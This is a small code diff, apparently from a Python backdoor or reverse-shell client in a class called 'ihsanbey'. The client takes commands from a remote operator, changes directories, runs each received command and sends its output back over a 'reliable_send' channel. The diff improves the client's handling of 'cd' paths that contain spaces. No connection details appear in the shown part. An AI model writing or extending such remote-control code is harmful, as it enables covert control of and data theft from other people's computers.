@@ -54,11 +54,11 @@ class ihsanbey:
                 exit()
 
             elif command.startswith("cd "):
-                path = command.split(" ")[1] 
+                path = " ".join(command.split(" ")[1:])
                 command_result =  self.change_dir(path)
                 self.reliable_send(command_result)
             else:
-                try:
+                try:    
                     resultt = self.execute_command(command.encode("utf-8"))
                     self.reliable_send(resultt.decode("utf-8"))
                 except BrokenPipeError:
